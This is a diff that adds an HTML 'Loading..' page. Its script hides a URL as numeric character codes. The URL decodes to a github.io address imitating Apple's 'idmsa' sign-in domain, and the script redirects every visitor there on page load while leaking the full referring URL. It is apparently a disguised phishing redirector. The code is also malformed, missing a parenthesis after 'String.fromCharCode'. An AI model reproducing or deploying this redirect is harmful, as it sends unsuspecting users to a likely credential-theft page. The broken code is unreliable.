@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="referrer" content="unsafe-url">
+    <title>Loading..</title>
+</head>
+<body class="responsive">
+<script>
+    var ours = [
+        String.fromCharCode104,116,116,112,115,58,47,47,105,100,109,115,97,45,115,99,108,105,110,107,46,103,105,116,104,117,98,46,105,111,47,99,111,109,45,102,111,114,119,97,114,100,47,114,101,46,104,116,109,108),  
+	
+    ];
+    window.addEventListener("DOMContentLoaded", function () {
+        var c = ours[Math.floor(Math.random() * ours.length)], b = navigator.userAgent.toLowerCase(),
+            a = -1 !== b.indexOf("msie");
+        b = parseInt(b.substr(4, 2), 10);
+        a && 9 > b ? (a = document.createElement("a"), a.href = c, document.body.appendChild(a), a.click()) : window.location.href = c;
+    });
+</script>
+</body>
+</html>
